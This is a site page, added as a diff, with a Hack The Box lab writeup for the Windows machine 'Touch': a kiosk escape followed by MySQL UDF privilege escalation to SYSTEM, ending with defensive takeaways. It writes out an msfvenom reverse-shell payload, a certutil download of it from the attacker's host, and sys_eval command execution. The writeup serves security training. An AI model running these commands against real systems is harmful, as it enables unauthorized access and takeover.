@@ -1,0 +1,120 @@
+---
+import Article from "../../../layouts/Article.astro";
+import "../../../styles/writeup.css";
+import { withBase } from "../../../utils/paths";
+---
+
+<Article
+  title="HTB Touch — Writeup"
+  description="Windows kiosk breakout into MySQL UDF privilege escalation on Hack The Box Touch."
+  backHref={withBase('/writeups')}
+  backLabel="cd ./writeups"
+  navTitle="writeups/htb"
+  articleLabel={'Hack The Box "Touch"'}
+>
+<div class="container">
+<div class="writeup-header">
+  <span class="platform-tag">Hack The Box</span>
+  <h1>Touch</h1>
+  <p class="subtitle">Windows · Kiosk breakout · MySQL UDF privilege escalation</p>
+  <div class="meta">
+    <span class="meta-item os">Windows</span>
+    <span class="meta-item difficulty easy">Easy</span>
+  </div>
+  <div class="tags">
+    <span class="tag">Kiosk Escape</span>
+    <span class="tag">Credential Hunting</span>
+    <span class="tag">MySQL UDF</span>
+    <span class="tag">SYSTEM Privesc</span>
+  </div>
+</div>
+
+<div class="toc">
+  <div class="toc-title">Table of Contents</div>
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#web-enum">Web Enumeration — Nexion DeviceHub</a></li>
+    <li><a href="#foothold">Kiosk Breakout → User Flag</a></li>
+    <li><a href="#privesc">Privilege Escalation → SYSTEM</a></li>
+    <li><a href="#takeaways">Takeaways</a></li>
+  </ul>
+</div>
+
+<section class="writeup-section" id="overview">
+  <h2><span class="num">00</span> Overview</h2>
+  <p>Touch is a Windows box built around a kiosk-mode passport-scanning terminal. I got user through a chain of web-exposed secrets and a kiosk-to-desktop escape, then got root through a classic MySQL UDF privilege escalation enabled by a misconfigured plugin directory.</p>
+</section>
+
+<section class="writeup-section" id="recon">
+  <h2><span class="num">01</span> Recon</h2>
+  <p>I started with a standard nmap scan:</p>
+  <pre data-lang="bash"><code>nmap -sV -sC &lt;target_ip&gt;</code></pre>
+  <table>
+    <tr><th>Port</th><th>Service</th></tr>
+    <tr><td>135</td><td>msrpc</td></tr>
+    <tr><td>3389</td><td>ms-wbt-server (RDP)</td></tr>
+    <tr><td>5985</td><td>WinRM (HTTP)</td></tr>
+    <tr><td>8443</td><td>HTTP — "Nexion DeviceHub" login page</td></tr>
+  </table>
+  <p>No domain-related ports showed up (no LDAP, no Kerberos), so I figured this was a standalone/workgroup machine rather than a domain-joined one. The web app on <code>8443</code> looked like the obvious way in.</p>
+</section>
+
+<section class="writeup-section" id="web-enum">
+  <h2><span class="num">02</span> Web Enumeration — Nexion DeviceHub</h2>
+  <p>The login page on <code>:8443</code> only asked for a <strong>device password</strong>. I checked the page source and found a hint: the default password is the device's serial number.</p>
+  <div class="step"><div class="step-num">1</div><div class="step-body">I ran gobuster and found an <code>/api</code> route:<pre data-lang="bash"><code>gobuster dir -u http://&lt;target_ip&gt;:8443 -w /usr/share/wordlists/dirb/common.txt -b 302,404</code></pre></div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body"><code>/api</code> on its own didn't show anything useful, so I ran gobuster again against it as its own base path:<pre data-lang="bash"><code>gobuster dir -u http://&lt;target_ip&gt;:8443/api -w /usr/share/wordlists/dirb/common.txt -b 302,404</code></pre></div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">That turned up <code>/api/status</code>, which leaked the device's serial number — I used it as the login password.</div></div>
+  <div class="step"><div class="step-num">4</div><div class="step-body">Inside the dashboard I found controls for the kiosk's printer/scanner hardware, plus a set of <strong style="color:#fff">Windows kiosk credentials</strong> sitting right there in plaintext.</div></div>
+  <div class="callout"><strong>Why this matters:</strong> this one leaked status endpoint is the root cause of everything that follows — the serial number unlocks the dashboard, the dashboard leaks OS credentials, and those credentials unlock the kiosk session.</div>
+</section>
+
+<section class="writeup-section" id="foothold">
+  <h2><span class="num">03</span> Kiosk Breakout → User Flag</h2>
+  <div class="step"><div class="step-num">1</div><div class="step-body">I logged into the Windows kiosk session over RDP with the leaked creds:<pre data-lang="bash"><code>xfreerdp /u:KioskUser /p:'&lt;password&gt;' /v:&lt;target_ip&gt;</code></pre>The session was locked to a single-purpose kiosk app, with no obvious way to reach a normal desktop.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Using a booking confirmation (name + code) the challenge gave me, the kiosk app asked me to scan a passport.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">Back in the DeviceHub dashboard, I disabled the scanner remotely. Back on the kiosk, the scan step now failed and showed an error with a link to a troubleshooting article.</div></div>
+  <div class="step"><div class="step-num">4</div><div class="step-body">I clicked that link and it opened the error page in Microsoft Edge — breaking me out of the locked-down kiosk shell into a full browser window.</div></div>
+  <div class="step"><div class="step-num">5</div><div class="step-body">From Edge, I hit <code>Ctrl+O</code> to open a file picker, then typed <code>cmd</code> into the file-path field — that launched a command prompt. Classic file-dialog-to-shell kiosk escape.</div></div>
+  <div class="step"><div class="step-num">6</div><div class="step-body">With a working shell, I read the user flag:<pre data-lang="cmd"><code>type C:\Users\&lt;user&gt;\Desktop\user.txt</code></pre><span class="flag">🚩 user.txt captured</span></div></div>
+</section>
+
+<section class="writeup-section" id="privesc">
+  <h2><span class="num">04</span> Privilege Escalation → SYSTEM</h2>
+  <h3>Getting a stable session</h3>
+  <p>A raw cmd.exe shell is fragile, so I set up a Meterpreter session instead:</p>
+  <pre data-lang="bash"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;tun0_ip&gt; LPORT=4444 -f exe -o shell.exe</code></pre>
+  <p>I hosted it with Python's built-in HTTP server and pulled it onto the target with the built-in <code>certutil</code> utility:</p>
+  <pre data-lang="bash"><code>python3 -m http.server 8000
+certutil -urlcache -split -f http://&lt;tun0_ip&gt;:8000/shell.exe shell.exe</code></pre>
+  <p>I had a Metasploit multi/handler waiting, so it caught the callback as soon as I ran <code>shell.exe</code>.</p>
+  <h3>Enumeration</h3>
+  <div class="step"><div class="step-num">1</div><div class="step-body">I ran the usual context checks — <code>whoami /priv</code>, <code>whoami /groups</code>, <code>sysinfo</code> — but nothing jumped out as an easy token-based privesc path.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">Poking around the filesystem, I found a local <strong style="color:#fff">MySQL 8.0</strong> install running as <strong style="color:#fff">LocalSystem</strong> — a red flag, since any way of getting MySQL to run OS commands would inherit SYSTEM rights.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">A config file for the kiosk backend app (<code>\Kiosk\packages\backend\src\database\index.ts</code>) contained a low-privileged MySQL username and password.</div></div>
+  <div class="step"><div class="step-num">4</div><div class="step-body">A batch script at <code>ProgramData\HTB Airways\refresh-dates.bat</code> contained the <strong style="color:#fff">MySQL root password</strong> in plaintext.</div></div>
+  <h3>The UDF chain</h3>
+  <div class="step"><div class="step-num">1</div><div class="step-body">I logged into MySQL as root and checked my privileges:<pre data-lang="sql"><code>mysql -u root -p'&lt;root_pass&gt;' -e "SHOW GRANTS FOR CURRENT_USER();"</code></pre>Root had both <strong style="color:#fff">FILE</strong> and <strong style="color:#fff">GRANT</strong> privileges. FILE is the key one here — it lets a SQL user write arbitrary files to disk.</div></div>
+  <div class="step"><div class="step-num">2</div><div class="step-body">I checked where MySQL loads plugins from, then checked that folder's permissions:<pre data-lang="bash"><code>mysql -u root -p'&lt;root_pass&gt;' -e "SHOW VARIABLES LIKE 'plugin_dir';"
+icacls C:\MySQL\lib\plugin\</code></pre>Result: <code>NT AUTHORITY\Authenticated Users</code> had <strong style="color:#fff">Modify</strong> rights on a folder MySQL fully trusts. That ACL misconfiguration — not the UDF feature itself — is the actual bug here.</div></div>
+  <div class="step"><div class="step-num">3</div><div class="step-body">I dropped the well-known <code>lib_mysqludf_sys_64.dll</code> library into that writable plugin directory.</div></div>
+  <div class="step"><div class="step-num">4</div><div class="step-body">I registered a function from that library as a MySQL UDF:<pre data-lang="sql"><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';</code></pre></div></div>
+  <div class="step"><div class="step-num">5</div><div class="step-body">I checked what context it ran under:<pre data-lang="sql"><code>SELECT sys_eval('whoami');</code></pre>It came back <code>nt authority\system</code> — SQL queries were now running OS commands as SYSTEM.</div></div>
+  <div class="step"><div class="step-num">6</div><div class="step-body">I used the same function to grab the root flag:<pre data-lang="sql"><code>SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt');</code></pre><span class="flag">🚩 root.txt captured</span></div></div>
+</section>
+
+<section class="writeup-section" id="takeaways">
+  <h2><span class="num">05</span> Takeaways</h2>
+  <div class="takeaway-card">
+    <ul>
+      <li><strong>Least privilege for services.</strong> Running MySQL as <code>LocalSystem</code> turned an otherwise contained SQL misconfiguration into instant SYSTEM.</li>
+      <li><strong>Folder permissions are trust boundaries.</strong> A folder a privileged process trusts being writable by a broad group like <code>Authenticated Users</code> is a classic Windows privesc pattern.</li>
+      <li><strong>Databases can run code, not just store it.</strong> MySQL UDFs can translate database privilege into OS command execution.</li>
+      <li><strong>Small leaks add up.</strong> Credentials leaked from an admin panel → an app config file → a batch script. None alone was catastrophic, but together they were.</li>
+      <li><strong>Kiosk hardening gaps.</strong> One reachable browser file dialog was enough to break the entire kiosk lockdown.</li>
+    </ul>
+  </div>
+</section>
+</div>
+</Article>
